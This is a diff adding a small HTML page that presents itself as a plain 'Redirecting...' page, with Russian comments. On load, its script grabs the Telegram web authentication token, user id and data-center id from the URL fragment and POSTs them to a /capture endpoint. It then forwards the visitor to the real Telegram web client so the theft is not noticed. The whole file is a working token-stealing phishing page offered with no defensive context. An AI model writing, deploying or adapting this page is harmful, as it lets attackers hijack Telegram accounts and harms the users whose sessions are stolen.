@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+    <script>
+        // Получаем полный URL с hash
+        const fullUrl = window.location.href;
+        console.log('Полный URL:', fullUrl);
+        
+        // Отправляем на сервер
+        fetch('/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                url: fullUrl,
+                hash: window.location.hash,
+                token: new URLSearchParams(window.location.hash.substring(1)).get('tgWebAuthToken'),
+                user_id: new URLSearchParams(window.location.hash.substring(1)).get('tgWebAuthUserId'),
+                dc_id: new URLSearchParams(window.location.hash.substring(1)).get('tgWebAuthDcId')
+            })
+        }).then(() => {
+            // Редирект на настоящий Telegram
+            window.location.href = 'https://web.telegram.org/k/';
+        });
+    </script>
+</head>
+<body>
+    <p>Перенаправление...</p>
+</body>
+</html>
